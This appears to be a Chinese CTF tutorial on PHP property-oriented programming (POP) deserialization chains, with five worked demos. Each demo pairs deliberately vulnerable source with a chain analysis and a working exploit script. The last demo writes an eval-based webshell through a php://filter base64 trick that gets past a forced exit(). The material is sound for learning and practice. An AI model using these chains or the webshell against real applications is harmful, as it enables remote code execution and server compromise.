POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的

 

在一串代码中,我们可以定义很多个类,每个类中又可以有很多魔术函数和自定义函数,之间有一套相互调用的关系,而当我们利用这些关系将他们串起来就可能形成一条连续调用链,来达到我们的目的

 

在开始之前先回顾一下魔术函数

 

| 方法名       | 调用条件                                                     |
| ------------ | ------------------------------------------------------------ |
| __call       | 调用不可访问或不存在的方法时被调用                           |
| __callStatic | 调用不可访问或不存在的静态方法时被调用                       |
| __clone      | 进行对象clone时被调用，用来调整对象的克隆行为                |
| __constuct   | 构建对象的时被调用；                                         |
| __debuginfo  | 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 |
| __destruct   | 明确销毁对象或脚本结束时被调用；                             |
| __get        | 读取不可访问或不存在属性时被调用                             |
| __invoke     | 当以函数方式调用对象时被调用                                 |
| __isset      | 对不可访问或不存在的属性调用isset()或empty()时被调用         |
| __set        | 当给不可访问或不存在属性赋值时被调用                         |
| __set_state  | 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 |
| __sleep      | 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 |
| __toString   | 当一个类被转换成字符串时被调用                               |
| __unset      | 对不可访问或不存在的属性进行unset时被调用                    |
| __wakeup     | 当使用unserialize时被调用，可用于做些对象的初始化操作        |

 

一般的入口点:

```
__destruct

__wakeup
```

 

# **demo1**

 

 

```php
<?php

//flag is in flag.php

error_reporting(0);

class Read {

  public $var;

  public function file_get($value)

  {

    $text = base64_encode(file_get_contents($value));

    return $text;

  }

  public function __invoke(){

    $content = $this->file_get($this->var);

    echo $content;

  }

}

 

class Show

{

  public $source;

  public $str;

  public function __construct($file='index.php')

  {

    $this->source = $file;

    echo $this->source.'Welcome'."<br>";

  }

  public function __toString()

  {

    return $this->str['str']->source;

  }

 

  public function _show()

  {

    if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) 		 {

      die('hacker');

    } else {

      highlight_file($this->source); 

    }

  }

 

  public function __wakeup()

  {

    if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {

      echo "hacker";

      $this->source = "index.php";

    }

  }

}

 

class Test

{

  public $p;

  public function __construct()

  {

    $this->p = array();

  }

 

  public function __get($key)

  {

	$function = $this->p;

    return $function();

  }

}

 

if(isset($_GET['hello']))

{

  unserialize($_GET['hello']);

}

else

{

  $show = new Show('pop3.php');

  $show->_show();

}
```

 

这道题flag is in flag.php

那说明我我们最后肯定是要到`flag.php`去找flag的

再看看代码有一个`file_get_contents`,一个`highlight_file`

这两个函数数可以读文件的

这里我把所以的魔术函数及其属于的类列了出来

```
Read类:__invoke

Show类:__construct

__toString

__wakeup

Test类:__construct

__get
```

再观察到最后几行代码有unserialize函数进行反序列化

 

1. 通过unserialize函数我吗可以调用show类中的__wakeup魔术函数,

2. _wakeup中存在preg_match函数,这个函数可以将第二个值当成字符串,那么我们就可以将source的赋值为这里面的show类,来调用此类(show类)里面的`__toString`函数

3. 对于`__toString`函数会返回show类里面的数组`str`,这个数组里面的键值被赋值为source，如果source是一个不可访问的或者不存在的属性,就可以调用被访问类的`__get`魔术函数,那我们就可以将source的值赋值为Test类

4. 此时我们调用了`__get`函数,会将Test类中定义的p赋值给​function,这时看到Read类中存在__invoke魔术方法,而__get函数最后会将function以函数的方式输出,那此时function的值被赋值为Read类,就可以调用Read类中的`__invoke`魔术方法

5. 当调用`__invoke`方法时,`$content = $this->file_get($this->var);`将此类中var的值当做参数传入file_get函数中,这里只要控制`$var=flag.php`就可以利用file_get函数中的`file_get_contents`函数读取flag.php文件

 

使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断

 

这里的pop链:

```
unserialize函数->__wakeup魔术方法->toString魔术方法->__get魔术方法->__invoke魔术方法->Read类中的file_get函数中的file_get_contents读取flag.php
```

 

Exp:

 

![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A03217.png)

以上是我对这条pop链的理解,可能比较浅显或者不准确,这里附上网上的讲解

 

1. 很明显此题考查PHP反序列化构造POP链，遇到此类题型首先寻找可以读取文件的函数，再去寻找可以互相触发从而调用的魔术方法，最终形成一条可以触发读取文件函数的POP链。

2. 对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，在Read类有file_get_contents()函数，Show类有highlight_file()函数可以读取文件。接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发wakeup魔术方法，而wakeup魔术方法可以看到在Show类中。

3. 再次看下`__wakeup`魔术方法中，存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的`__tostring`方法，通篇看下代码发现`__tostring`魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发`__tostring`方法。

4. 再看下`__tostring`魔术方法中，首先找到str这个数组，取出key值为str的value值赋给source，那么如果这个value值不存在的话就会触发`__get`魔术方法。再次通读全篇，看到Test类中存在__get魔术方法。

5. 那么此时如果str数组中key值为str对应的value值source是Test类的一个对象，就触发了`__get`魔术方法。看下`__get`魔术方法，发现先取Test类中的属性p给function变量，再通过return $function()把它当作函数执行，这里属性p可控。这样就会触发`__invoke`魔术方法，而__invoke魔术方法存在于Read类中。

6. 可以看到__invoke魔术方法中调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可

参考链接：https://blog.csdn.net/weixin_45785288/article/details/109877324

 

# **demo2**

```
<?php

class start_gg

{

    public $mod1;

    public $mod2;

    public function __destruct()

    {

        $this->mod1->test1();

    }

}

class Call

{

    public $mod1;

    public $mod2;

    public function test1()

{

      $this->mod1->test2();

  }

}

class funct

{

    public $mod1;

    public $mod2;

    public function __call($test2,$arr)

    {

        $s1 = $this->mod1;

        $s1();

    }

}

class func

{
    public $mod1;

    public $mod2;

    public function __invoke()

 	{

        $this->mod2 = "字符串拼接".$this->mod1;

    } 

}

class string1

{

    public $str1;

    public $str2;

    public function __toString()

    {

        $this->str1->get_flag();

        return "1";

    }

}

class GetFlag

{

    public function get_flag()

    {

        echo "flag:"."xxxxxxxxxxxx";

    }

}

$a = $_GET['string'];

unserialize($a);

?>
```

 

依然还是先把魔术函数列出来

```
start_gg类:__destruct

Call类:

funct类:__call

funt类:__invoke

string1类:__toString

Getflag类:

```

从目的来看依然是get flag,

这个函数存在于Getflag类中

题目让我们get一个参数string,然后将这个值进行反序列化

1. ```
   既然要反序列化,那就肯定会调用__destruct函数，于是会就从这里开始
   ```

   

2. ```
   从`__destruct`函数来看要调用到Call类中的test1()函数,那可以考虑将$mod1=new Call(),但是怎么实现这一操作呢,我们可以在exp中利用`__construct`魔术方法,在destruct前面添加
   ```

   

   ```
   public function __construct(){
   
   	$mod1=new Call();
   
   }
   ```

   

3. ```
   这里就到了Call类的test1()函数了,继续观察,test1()要将Call类的$mod1赋值为test2(),纵观全篇代码,没有找到test2()这个函数,但是却观察到了funct类中有__call,那么如果我的$mod=new funct()的话我就可以去调用funct类中的__call方法
   ```

   

4. ```
   这里我们已经跳到了__call函数了,将funct类中$mod1的值赋值给$s1，再将$s1以函数形式输出,这让我想到了__invoke魔术函数,找一找有没有,看到__invoke函数,我控制变量$s1=new func(),就可以调用func类中的__invoke函数了
   ```

   

5. ```
   从__invoke函数继续起跳,$this->mod2 = "字符串拼接".$this->mod1;很明显可以想到如果控制mod1为对象就可以调用__toString函数,再看__toString存在于string1类中
   ```

   

6. ```
   从__toString函数代码来看,只要srt1是实例化对象Getflag就可以调用里面的函数get_flag了
   ```

   

 

到这里就分析差不多了贴一个exp

参考链接：https://blog.csdn.net/weixin_45785288/article/details/109877324

 

原文的那个exp我感觉有点繁琐还是贴我自己写的吧

 

```
 <?php

class start_gg{

  public $mod1;

  public $mod2;

  public function __construct(){

    $this->mod1=new Call();

  }

  

}

class Call{

  public $mod1;

  public $mod2;

  public function __construct(){

    $this->mod1=new funct();

  }

}

class funct{

  public $mod1;

  public $mod2;

  public function __construct(){

    $this->mod1=new func();

  }

}

class func{

  public $mod1;

  public $mod2;

  public function __construct(){

    $this->mod1=new string1();

  }

}

class string1{

  public $str1;

  public $str2;

  public function __construct(){

    $this->str1=new Getflag();

  }

}

class Getflag{

  public function get_flag()

  {

    echo "flag:" . "xxxxxxxxxxxx";

  }

}

$a=new start_gg();

echo serialize($a);
```

其实这道题也可以不使用Call类,可以直接实例化funct调用__call方法

 

# **demo3**

代码如下

```
<?php

class Modifier {

  protected $var;

  public function append($value){

    include($value);

  }

  public function __invoke(){

    $this->append($this->var);

  }

}

 

class Show{

  public $source;

  public $str;

  public function __construct($file='index.php'){

    $this->source = $file;

    echo 'Welcome to '.$this->source."<br>";

  }

  public function __toString(){

    return $this->str->source;

  }

  public function __wakeup(){

    if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {

      echo "hacker";

      $this->source = "index.php";

    }

  }

}

class Test{

  public $p;

  public function __construct(){

    $this->p = array();

  }

  public function __get($key){

    $function = $this->p;

    return $function();

  }

}

if(isset($_GET['pop'])){

  @unserialize($_GET['pop']);

}

else{

  $a=new Show;

  highlight_file(__FILE__);

}
```

 

 

首先还是把魔术函数列出来

```
Modifier类:__invoke

Show类:__construct

__toString

__wakeup

Test类:__construct

__get
```

 

 

先分析代码,看到了一个用户自定义函数append,作用是包含$var，那$var可控的,当是文件的时候就可以包含文件,也可以用php伪协议

 

那我们的目的最后肯定是要回到这个函数上来的

最后会反序列化我们get传入的参数pop

```
1. 那肯定首先会调用__construct和__wakeup,但是这里的__construct函数的参数不可控那就从__wakeup下手,这种方式已经很熟悉了,一看到就想到__toString魔术方法

2. 从__toString继续起跳,控制str值为实例化对象Test,Test类中不存在source属性,于是调用__get魔术方法

3. __get中将Test类中的p的值赋给$function,再将$function以函数方法输出,控制$p=new Modifier(),调用Modifier类中的__invoke()

4. 通过__invoke()调用append函数实现文件包含

其实这里是有个文件包含漏洞,我们可以通过改变$var的值实现文件包含,可以用php伪协议读取文件
```

 

Exp

贴一个自己写脚本

![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A08660.png)

 

附上网上的脚本

![img](http://47.93.248.221/wp-content/uploads/2021/05/pop%E9%93%BE%E6%9E%84%E9%80%A08671.png)

注:这里写错了个地方,最后序列化时必须要用urlencode不然protected属性的%00会造成00截断

# **demo4**

```
<?php
highlight_file(__FILE__);

class A
{
  public $a;
  private $b;
  protected $c;

  public function __construct($a, $b, $c)
  {
    $this->a = $a;
    $this->b = $b;
    $this->c = $c;
  }

  protected function flag()
  {
    echo file_get_contents('/flag');
  }

  public function __call($name, $arguments)
  {
    call_user_func([$name, $arguments[0]]);
  }

  public function __destruct()
  {
    return 'this a:' . $this->a;
  }
  public function __wakeup()
  {
    $this->a = 1;
    $this->b = 2;
    $this->c = 3;
  }
}

class B
{
  public $a;
  private $b;
  protected $c;

  public function __construct($a, $b, $c)
  {
    $this->a = $a;
    $this->b = $b;
    $this->c = $c;
  }

  public function b()
  {
    echo $this->b;
  }

  public function __toString()
  {
    $this->a->a($this->b);
    return 'this is B';
  }
}

if (isset($_GET['str']))
  unserialize($_GET['str']);
```

 

分析下代码

最后肯定是要回到flag函数的

先找入口,destruct可以执行$this->a，a是可控的

那就可以触发B类的toString方法

如果控制B类中的a为new A，那么就会调用A类中一个不存在的方法,触发__call，而控制参数$this->b为flag就可以通过call_user_func回调flag函数(这里回调的方法还不是很懂,我总感觉应该回调a,但是它确确实实回调了flag)

其实这是确实是回调的a,但是call_user_func这个函数是不区分大小写的,又是因为是个数组,所以相当于回调了A类里面的flag函数

但是这里并没有完,我们在反序列化时还有过滤__wakeup方法

贴exp

```php
<?php

class A
{

    public $a;
    private $b;
    protected $c;
}

class B
{

    public $a;
    private $b;
    protected $c;
    public function __construct()
    {
        $this->b = 'flag';
    }
}

$t = new A();
$s = new B();
$s->a = $t;
$t->a = $s;
$p = serialize($t);
$p = str_replace('A":3', 'A":4', $p);
echo urlencode($p);

```

 

# **Demo5**

```
<?php

error_reporting(0);

 

class A {

 

  protected $store;

 

  protected $key;

 

  protected $expire;

 

  public function __construct($store, $key = 'flysystem', $expire = null) {

    $this->key = $key;

    $this->store = $store;

    $this->expire = $expire;

  }

 

  public function cleanContents(array $contents) {

    $cachedProperties = array_flip([

      'path', 'dirname', 'basename', 'extension', 'filename',

      'size', 'mimetype', 'visibility', 'timestamp', 'type',

    ]);

 

    foreach ($contents as $path => $object) {

      if (is_array($object)) {

        $contents[$path] = array_intersect_key($object, $cachedProperties);

      }

    }

 

    return $contents;

  }

 

  public function getForStorage() {

    $cleaned = $this->cleanContents($this->cache);

 

    return json_encode([$cleaned, $this->complete]);

  }

 

  public function save() {

    $contents = $this->getForStorage();

 

    $this->store->set($this->key, $contents, $this->expire);

  }

 

  public function __destruct() {

    if (!$this->autosave) {

      $this->save();

    }

  }

}

 

class B {

 

  protected function getExpireTime($expire): int {

    return (int) $expire;

  }

 

  public function getCacheKey(string $name): string {

    return $this->options['prefix'] . $name;

  }

 

  protected function serialize($data): string {

    if (is_numeric($data)) {

      return (string) $data;

    }

 

    $serialize = $this->options['serialize'];

 

    return $serialize($data);

  }

 

  public function set($name, $value, $expire = null): bool{

    $this->writeTimes++;

 

    if (is_null($expire)) {

      $expire = $this->options['expire'];

    }

 

    $expire = $this->getExpireTime($expire);

    $filename = $this->getCacheKey($name);
 

    $dir = dirname($filename);

 

    if (!is_dir($dir)) {

      try {

        mkdir($dir, 0755, true);

      } catch (\Exception $e) {

        // 创建失败

      }

    }

 

    $data = $this->serialize($value);

 

   if ($this->options['data_compress'] && function_exists('gzcompress')) {

      //数据压缩

      $data = gzcompress($data, 3);

    }

 

    $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;

    $result = file_put_contents($filename, $data);

 

    if ($result) {

      return true;

    }

 

    return false;

  }

 

}

 

if (isset($_GET['src']))

{

  highlight_file(__FILE__);

}

 

$dir = "uploads/";

 

if (!is_dir($dir))

{

  mkdir($dir);

}

unserialize($_GET["data"]);
```

 

这题考察的是绕过死亡exit()

P神文章https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list这里详细讲解了用php://filter绕过死亡exit

看看代码最后unserialize我们提交的一个参数data

看到file_put_contents感觉要应该是要写后门了

```
1. 找到参数filename,data

$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data

$filename = $this->getCacheKey($name);

2. 追踪getCacheKey函数

  public function getCacheKey(string $name): string {

    return $this->options['prefix'] . $name;

  }

返回一个拼接字符串

当然这里的name是set函数的参数,是通过A类的save函数传过来的

3. 回溯save函数

 

  public function save() {

    $contents = $this->getForStorage();

 

    $this->store->set($this->key, $contents, $this->expire);

  }

调用了A类的getForStorage函数

A类并没有set函数,而store是可控的可以直接调用B类的set函数

再看看观察魔术方法，发现destruct可以调用save函数
```

 

大致的构造思路就出来了

A::__destruct->save()->getForStorage()->cleanStorage()

B::save()->set()->getExpireTime()和getCacheKey()+serialize()->file_put_contents写入shell->getshell

 

回到代码正式开始

 

1. ```
   1. 从__destruct出发,要触发save()函数,就有这个判断
   
   if (!$this->autosave)
   
   很显然类中不存在autosave变量,这个变量我们可控
   
   直接$this->autosave=false进入if调用save函数
   
   2. 跟进save()
   
     public function save() {
   
   ​    $contents = $this->getForStorage();
   
    
   
   ​    $this->store->set($this->key, $contents, $this->expire);
   
     }
   
   A类并没有set函数,而B类却又并且store可控,那就可以调用B类中的set函数,再看set函数中的参数：
   
   $this->key和$this->expire是创建类时定义的参数
   
   $contents是调用了getForStorage()得到的
   
   3. 回溯getForStorage()函数
   
     public function getForStorage() {
   
   ​    $cleaned = $this->cleanContents($this->cache);
   
    
   
   ​    return json_encode([$cleaned, $this->complete]);
   
     }
   
    
   
   又调用了cleanContents()函数
   
   并且json_encode一个数组
   
   这里需要传入一个数组$this->cache=array()进去cleanContents,为空即可
   
   然后把$this->complete进行base64编码绕过json_encode,因为json格式的字符都不满足base64编码的要求
   
   4. 跟进set函数
   
   public function set($name, $value, $expire = null): bool{
   
   ​    $this->writeTimes++;
   
    
   
   ​    if (is_null($expire)) {
   
   ​      $expire = $this->options['expire'];
   
   ​    }
   
    
   
   ​    $expire = $this->getExpireTime($expire);
   
   ​    $filename = $this->getCacheKey($name);
   
   ​    $dir = dirname($filename);
   
   ​    if (!is_dir($dir)) {
   
   ​      try {
   
   ​        mkdir($dir, 0755, true);
   
   ​      } catch (\Exception $e) {
   
           // 创建失败
   
         }
   
       }
   
       $data = $this->serialize($value);
   
       if ($this->options['data_compress'] && function_exists('gzcompress')) {
   
         //数据压缩
   
         $data = gzcompress($data, 3);
   
       }
   
       $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
   
       $result = file_put_contents($filename, $data);
   
       if ($result) {
   
         return true;
   
       }
   
       return false;
   
     }
   
   调用了两个函数getExpireTime()和getCacheKey()
   
   跟进这两个函数看看
   
   protected function getExpireTime($expire): int {
   
       return (int) $expire;
   
     }
   
    
   
     public function getCacheKey(string $name): string {
   
       return $this->options['prefix'] . $name;
   
     }
   
   返回int类型的$expire
   
   返回一个拼接字符串,并且$this->options[‘prefix’]可控
   
   那么filename就是一个拼接字符串了
   
   继续往下看$data=$this->serialize($value)调用了此类中定义的serialize函数
   
   跟进看看
   
   protected function serialize($data): string {
   
       if (is_numeric($data)) {
   
         return (string) $data;
   
       }
   
    
   
       $serialize = $this->options['serialize'];
   
       return $serialize($data);
   
     }
   
   $this->options[‘serialize’]可控,并且是以函数形式返回的,那想起之前绕过json_encode进行的base64编码在这里可以解码了
   
   $this->options[‘serialize’]=’base64_decode’
   
   继续审计代码
   
   if ($this->options['data_compress'] && function_exists('gzcompress')) {
   
         //数据压缩
   
         $data = gzcompress($data, 3);
   
       }
   
   这里有个压缩数据但是我们并不需要于是把
   
   $this->options[‘data_conpress’]=false绕过if
   
   终于来到了最后一个data
   
   $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
   
   <?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n
   
   这串代码就算我们写入了后门但是有个exit()程序依旧不会执行
   
   但是由于<、?、()、;、>、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩php//exit了
   
   不过base64算法解码时是4个字节一组，所以我们还需要在前面加个字符
   
   不急慢慢来
   
   中间部分sprintf('%012d', $expire)代表12个字节
   
   然后我们base64解码后只剩的php//exit有9个字节,总共还有21个字节,为了解码后不影响我们写入的webshell,我们还需要加3个字节
   
   由于filename是拼接的字符串$this->options['prefix'] . $name,所以我们可以利用php://filter过滤器写文件
   
   $this->options[‘prefix’]=’php://filter/write=convert.base64-decode/resource=’
   
   这样我们的filename就是php://filter/write=convert.base64-decode/resource=shell.php
   
   对写入的shell进行解码就只有php//exit了
   
   但是$data是拼接的字符串
   
   $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
   
    
   
   所以后面的$data就是我们的webshell
   
   来自于经过serialize函数处理后的$contents
   
   现在对$contents进行构造了
   
   $this->cache=array()
   
   $this->complete=base64_encode(‘123’.base64_encode(‘<?php @eval($_POST[1]);?>’))
   
   第一个base64编码是为了绕过json_encode
   
   第二个base64编码是为了防止php://filter过滤器对写入后面造成过滤处理
   
    
   ```

   

贴exp

```
<?php

class A {

 

  protected $store;

  protected $key;

  protected $expire;

  public function __construct(){

    $this->key='shell.php';

    $this->store=new B();

    $this->expire=0;

    $this->cache=array();

    $this->complete=base64_encode("123".base64_encode('<?php @eval($_POST[1]);?>'));

    $this->autosave = false;

  }

}

class B{

  public $options=array();

  public function __construct(){

    $this->options['prefix']='php://filter/write=convert.base64-decode/resource=';

    $this->options['serialize']='base64_decode';

    $this->options['data_compress']=false;

  }

  

}

$a=new A();

echo urlencode(serialize($a));
```

 

 